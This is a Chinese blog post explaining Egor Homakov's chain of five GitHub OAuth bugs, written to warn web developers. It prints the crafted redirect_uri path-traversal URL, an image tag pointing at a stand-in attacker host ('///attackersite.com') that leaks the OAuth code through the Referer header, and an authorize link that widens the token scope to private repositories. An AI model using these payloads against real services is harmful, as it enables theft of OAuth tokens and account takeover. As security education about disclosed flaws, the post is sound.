```
       Egor Homakov（Twitter: [@homakov](http://twitter.com/homakov)个人网站: [EgorHomakov.com](http://egorhomakov.com/)）
       是一个Web安全的布道士，他这两天把github给黑了，并给github报了5个安全方面的bug，他在他的这篇blog——
       《[How I hacked Github again](http://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html)》（墙）
       说明了这5个安全bug以及他把github黑掉的思路。Egor的这篇文章讲得比较简单，很多地方一笔带过，
       所以，**我在这里用我的语言给大家阐述一下黑掉Github的思路以及原文中所提到的那5个bug。
       希望这篇文章能让从事Web开发的同学们警惕**。关于Web开发中的安全事项，大家可以看看这篇文章
       《[Web开发中的你需要了解的东西](https://coolshell.cn/articles/6043.html)》
```

![](/assets/git-1.png)

### OAuth简介

首先，这个故事要从[Github OAuth](https://developer.github.com/v3/oauth/)讲起。所以，我们需要先知道什么是[OAuth](http://en.wikipedia.org/wiki/OAuth)。所谓OAuth就是说，第三方的应用可以通过你的授权而不用知道你的帐号密码能够访问你在某网站的你自己的数据或功能。像Google, Facebook, Twitter等网站都提供了OAuth服务，提供OAuth服务的网站一般都有很多开放的API，第三方应用会调用这些API来开发他们的应用以让用户拥有更多的功能，但是，当用户在使用这些第三方应用的时候，这些第三方的应用会来访问用户的帐户内的功能和数据，所以，当第三应用要干这些事的时候，我们不能让第三方应用弹出一个对话框来问用户要他的帐号密码，不然第三方的应用就把用户的密码给获取了，所以，OAuth协议会跳转到一个页面，让用户授权给这个第三方应用以某些权限，然后，这个权限授权的记录保存在Google/Facebook/Twitter上，并向第三方应用返回一个授权token，于是第三方的应用通过这个token来操作某用户帐号的功能和数据时，就畅通无阻了。下图简单地说明了Twitter的OAuth的授权过程。

![](/assets/git-2.png)

从上面的流程图中，我们可以看OAuth不管是1.0还是2.0版本都是一个比较复杂的协议，所以，在Server端要把OAuth实现对并不是一些容易事，其总是或多或少会有些小错误。Egor就找到了几个Github的OAuth的实现的问题。

### OAuth的Callback

还需要注意的是，因为OAuth是需要跳到主站的网页上去让用户授权，当用户授权完后，需要跳转回原网页，所以，一般来说，OAuth授权页都会带一个 redirect\_url的参数，用于指定跳转回原来的网页。Github使用的这个跳转参数是redirect\_uri参数。一般来说，redirect\_uri这个参数需要在服务器端进行验证。

你想一下，如果有人可以控制这个redirect\_uri这个参数，那么，你就可以让其跳转到别的网页上（可能会是个有恶意的网页）。如果你觉得跳转到别的网页上也无所谓，那么你就错了。别忘了，当你对这个第三方的应用授权通过后，服务方会给第三方应用返回一个授权token，这个token会被加到那个redirect\_uri参数后面然后跳转回去，如果这个redirect\_uri被别有用心的人改一个恶意的网址后，这个token也就被转过去了，于是授权token也就被泄漏过去了。

知道了这一切，我们就可以理解Egor提的那5个bug是什么意思了。

#### 

### 第一个Bug — 没有检查重定向URL中的/../

首先，我们通过[Github的 redirect\_uri 的说明文档](https://developer.github.com/v3/oauth/#redirect-urls)我们可以看到这样的说明：

```
如果 CALLBACK URL是: http://example.com/path

GOOD: https://example.com/path
GOOD: http://example.com/path/subdir/other

BAD: http://example.com/bar
BAD: http://example.com/
BAD: http://example.com:8080/path
BAD: http://oauth.example.com:8080/path
BAD: http://example.org
```

而Github对于redirect\_uri做了限制，要求只能跳回到 [https://gist.github.com/auth/github/callback/](https://gist.github.com/auth/github/callback/)，

也就是说，域名是gist.github.com，目录是/auth/github/callback/，服务器端做了这个限制，看似很安全了。

但是，Egor发现，Github的服务器端并没有验证.. /../../这样的情况。

于是，Egor相当于构造了一个下面这样的Redirect URL：

```
https://gist.github.com/auth/github/callback/../../../homakov/8820324?code=CODE
```

于是上面的URL就相当于：

```
https://gist.github.com/homakov/8820324?code=CODE
```

你可以看到，认证后的跳转网页转到了别的地方去（并非是github限制的地方）——我们知道Github的gist虽然是给你分享代码片段的，但是也可以用来定制自己的东西的（比如markdown），这个gist的网页当然是被Egor所控制的。

#### 

### 第二个BUG — 没有校验token

第一个bug其实并没有什么，如果服务器端要校验一下token是否和之前生成的token的redirect\_uri一模一样，只要服务器做了这个验证，第一个bug完全没有什么用处，但是，github的服务端并没有验证。

这就是第二个bug，于是第一个和第二个bug组合起来成了一个相当有威力的安全漏洞。

也就是说，token的生成要考虑redirect\_uri，这样，当URL跳转的时候，会把redirect\_uri和token带到跳转页面（这里的跳转页面还是github自己的），跳转页面的服务端程序要用redirect\_uri来生成一个token，看看是不是和传来的token是一个样的。这就是所谓的对URL进行签名——以保证URL的不被人篡改。一般来说，对URL签名和对签名验证的因子包括，源IP，服务器时间截，session，或是再加个salt什么的。

### 第三个BUG — 注入跨站图片

现在，redirect\_uri带着code，安全顺利地跳到了Egor构造的网页上：

```
https://gist.github.com/homakov/8820324?code=CODE
```

但是，这个是gist的网页，你无法在这个页面上运行前端（Javascript）或后端程序（Ruby——Github是Ruby做的），现在的问题是我们怎么得到那个code，因为那个code虽然后带到了我的网页上来，但那个网页还是github和用户自己的环境。

到这里，一般来说，黑客会在这个页面上放一个诸如下面的一个链接，来引诱用户点击，：

                                 `<a href=http://hack.you.com/>私人照片</a>`

这样，当页面跳转到黑客的网站上来后，你之前的网页上的网址会被加在http头里的 Refere 参数里，这样，我就可以得到你的token了。

但是，在gist上放个链接还要用户去点一下，这个太影响“用户体验”了，最好能嵌入点外部的东西。gist上可以嵌入外站的图片，但是github的开发人员并非等闲之辈，对于外站的图片，其统统会把这些图片的url代理成github自己的url，所以，你很难搞定。

不过，我们可以用一个很诡异的技巧：

```
                                  **&lt;img src=”///attackersite.com”&gt;**
```

这个是什么玩意？这个是个URL的相对路径。但是为什么会有三个///呢？呵呵。

##### 像程序员一样的思考

这个时候，我们需要以“程序员的编程思维”来思考问题——如果你是程序员，你会怎么写校验URL的程序？你一定会想到使用正则表达式，或是用程序来匹配URL中的一些pattern。于是，

* 对于绝对路径：你会匹配两个//，后面的可能会是 user@host.com（user@是可选的），然后可能会有:&lt;n&gt;端口号，然后是/，后面是服务器的路径，再往后面应该是?后面带一些参数了。

* 对于相对路径：就没有绝对路径那么复杂了。就是些 .. 和 /再加上?和一些参数。

好了，如果coolshell.cn网页中的&lt;img src=&gt;或&lt;a href=&gt;中用到的相对路径是 /host.com，那么浏览器会解释成：

`https://coolshell.cn/host.com，如果是///host.com，那么就应该被浏览器解释成 https://coolshell.cn///host.com。`

但是，Chrome和Firefox，会把///host.com当成绝对路径，因为其正确匹配了绝对路径的scheme。如果你正在用Chrome/Firefox看这篇文章 ，你可以看看下面的连接（源码如下）：

```
                           [CoolShell Test](https://www.google.com/)
```

```
<a href="///www.google.com">CoolShell Test</a>
```

关键是，这个Chrome/Firefox的问题被标记成了Won’t Fix，我勒个去，基本上来说，后台的程序也有可能有这样的问题，对于Perl，Python，Ruby，Node.js，PHP带的URL检查的函数库都有这样的问题。

于是，我们就可以使用这样的方式给gist注入了一个第三方站点的图片（github的服务端没有察觉到（因为我们前面说过大多数语言的URL检查库都会被 Bypass了），但是浏览器端把这个链接解释到了第三方的站点上），于是请求这个图片的http头中的refere 中包含用户当前页面的URL，也包含了用户授权的code。

到这里，黑客Egor已经拿到用户gist的权限并可以修改或查看用户私用的gist了。但是作者并没有满足，他想要的更多。

### 

### 第四个bug – Gist把github\_token放在了cookie里

于是Egor在用户的cookie里找到了 github\_token

![](/assets/git-3.png)

但是这个token没什么用，因为授权的Scope只有gists。但是，这个token不应该放在用户端的cookie里，本身就是一个安全事故，这个东西只能放在服务端（关于Web开发中的安全事项，可以看看这篇文章《[Web开发中的你需要了解的东西](https://coolshell.cn/articles/6043.html)》）。

于是，Egor只能另谋出路。

### 第五个Bug – 自动给gist授权

因为gist是github自家的，Egor所以估计github想做得简单一点，当用户访问gist的时候，不会出弹出一个OAuth的页面来让用户授权，不然，用户就会很诧异，都是你们自家的东西，还要授权？所以，Egor猜测github应该是对gist做了自动授权，于是，Egor搞了这样的一个URL（注意其中的 redirect\_uri中的scope ）

```
https://github.com/login/oauth/authorize?client_id=7e0a3cd836d3e544dbd9&redirect_uri=
https%3A%2F%2Fgist.github.com%2Fauth%2Fgithub%2Fcallback/../../../homakov/8820324&
response_type=code&scope=repo,gists,user,delete_repo,notifications
```

于是，这个redirect-uri不但帮黑客拿到了访问gist的token，而且还把授权token的scope扩大到了用户的代码库等其它权限。于是你就可以黑入用户的私有代码区了。

参考：

从“黑掉GITHUB”学WEB安全开发   [https://coolshell.cn/articles/11021.html](https://coolshell.cn/articles/11021.html)

